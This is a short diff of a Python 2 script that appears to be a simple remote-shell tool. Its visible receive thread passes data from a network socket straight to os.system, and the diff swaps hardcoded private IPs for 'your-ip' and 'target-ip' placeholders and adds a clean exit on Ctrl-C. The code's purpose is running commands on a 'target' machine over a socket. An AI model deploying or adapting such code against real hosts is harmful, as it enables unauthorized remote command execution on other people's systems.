@@ -13,7 +13,8 @@ def recv_thread(sock_used):
     os.system(data)
 
 def main():
-    mainsock = lqsock.Sock("192.168.0.252", "192.168.0.83", 3083)
+    global mainsock
+    mainsock = lqsock.Sock("your-ip", "target-ip", 3083)
     mainsock.create()
     mainsock.try_conn()
 
@@ -28,4 +29,8 @@ def main():
     s_t.join()
     r_t.join()
 
-main()
+try:
+    main()
+except KeyboardInterrupt as msg:
+    mainsock.quit()
+    print "Done!"
